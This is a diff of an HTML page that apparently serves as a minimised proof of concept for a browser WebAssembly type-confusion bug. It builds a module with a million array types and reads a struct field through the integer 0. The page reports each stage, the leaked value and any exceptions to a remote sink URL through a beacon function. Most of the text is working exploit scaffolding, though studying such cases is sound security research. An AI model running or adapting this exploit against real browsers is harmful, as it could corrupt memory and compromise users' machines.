@@ -4,12 +4,13 @@ function beacon(t, v){
   try { fetch(SINK + '?t=' + encodeURIComponent(t) + '&v=' + encodeURIComponent(String(v).slice(0,200)), {mode:'no-cors'}); } catch(e) {}
 }
 beacon('start', 'esc2887-min');
+
 function wasmUnsignedLeb(val) {
   var bytes = [];
   do { var b = val & 0x7f; val >>>= 7; if (val !== 0) b |= 0x80; bytes.push(b); } while (val !== 0);
   return bytes;
 }
-beacon('stage', 'building-module');
+
 var b = new WebAssembly.ModuleBuilder();
 b.startRecGroup();
 for (var i = 0; i < 1000000; i++) b.addArray(126);
@@ -19,7 +20,11 @@ b.endRecGroup();
 var sigIdx = b.addType({params: [b.wasmRefType(structIdx)], results: [127]});
 b.addFunction("read", sigIdx).addBody([0x20, 0, 0xfb, 0xc, structIdx].concat(wasmUnsignedLeb(0)).concat([0x0b])).exportFunc();
 var inst = b.instantiate();
-beacon('stage', 'module-built');
-var r = inst.exports.read(0);
-beacon('fire', 'r=' + r.toString(16));
+beacon('stage', 'built');
+try {
+  var r = inst.exports.read(0);
+  beacon('fire', 'r=' + r.toString(16));
+} catch(e) {
+  beacon('exc', String(e).slice(0,100));
+}
 </script></body></html>
